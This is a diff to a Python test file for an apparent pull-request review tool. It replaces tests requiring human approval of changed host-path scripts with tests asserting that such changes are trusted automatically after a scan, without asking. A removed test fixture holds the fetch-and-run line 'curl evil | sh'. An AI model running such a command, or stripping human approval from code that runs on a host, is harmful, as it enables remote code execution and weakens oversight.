@@ -509,22 +509,22 @@ class ScanTest(PRTestCase):
 
 
 class TrustTest(PRTestCase):
-    def test_a_change_to_a_host_path_waits_for_approval(self):
-        self.push_new_head({".placido/stack.sh": "curl evil | sh\n"}, "main")
-        self.answers = [False]
-        with self.assertRaisesRegex(pr.PRStop, "changes host paths"):
-            pragents.review(self.ctx)
-        self.assertIn("Have you read that change", self.asked[0])
-        self.assertNotIn("pr.gates", self.kinds())
-        diff = self.run.path / "rounds" / "1" / "host-paths.diff"
-        self.assertIn("curl evil", diff.read_text())
-
-    def test_an_approved_change_is_the_new_reference(self):
+    def test_a_change_to_a_host_path_runs_on_the_scan_s_word_unasked(self):
         self.push_new_head({".placido/stack.sh": "echo new stack\n"}, "main")
-        self.answers = [True]
+        pragents.review(self.ctx)
+        self.assertEqual(self.asked, [])
+        kinds = self.kinds()
+        self.assertLess(kinds.index("pr.scan"), kinds.index("pr.trust_approved"))
+        self.assertLess(kinds.index("pr.trust_approved"), kinds.index("pr.gates"))
+        self.assertEqual(runlog.last_event(self.run.path, "pr.trust_approved")["by"], "scan")
+        diff = self.run.path / "rounds" / "1" / "host-paths.diff"
+        self.assertIn("echo new stack", diff.read_text())
+
+    def test_a_trusted_change_is_the_new_reference(self):
+        self.push_new_head({".placido/stack.sh": "echo new stack\n"}, "main")
         rnd = pragents.review(self.ctx)
         self.assertEqual(pr.trust_reference(self.ctx, rnd), rnd.head)
-        pr.verify_host_paths(self.ctx, rnd, "a test")  # the approved content holds
+        pr.verify_host_paths(self.ctx, rnd, "a test")  # the trusted content holds
 
     def test_a_host_path_changed_after_it_was_trusted_stops_the_next_command(self):
         rnd = pragents.review(self.ctx)
@@ -644,14 +644,13 @@ class RoundTest(PRTestCase):
         self.assertEqual((pragents.review(self.ctx).number, pr.rounds(self.run.path)[-1].here), (3, False))
         self.assertEqual(pr.rounds(self.run.path)[-1].head, pushed)
 
-    def test_a_host_path_changed_here_without_approval_is_asked_about_again(self):
+    def test_a_host_path_changed_here_is_trusted_unasked(self):
         pragents.review(self.ctx)
-        self.fixed(name=".placido/stack.sh")  # a fix's commit whose change to a host path nobody approved
-        with self.assertRaisesRegex(pr.PRStop, "stopped: the pull request changes host paths"):
-            pragents.review(self.ctx)
-        self.assertEqual(self.asked, ["Have you read that change, and may it run here?"])
-        self.assertNotIn("pr.trust_approved", self.kinds())
-        self.assertNotIn("r2-review-a", self.runner.names())
+        self.fixed(name=".placido/stack.sh")  # a commit here whose change to a host path placido never saw
+        rnd = pragents.review(self.ctx)
+        self.assertEqual((rnd.number, self.asked), (2, []))
+        self.assertEqual(runlog.last_event(self.run.path, "pr.trust_approved")["round"], 2)
+        self.assertIn("r2-review-a", self.runner.names())
 
     def test_a_fix_that_changed_no_code_is_reviewed_too(self):
         pragents.review(self.ctx)
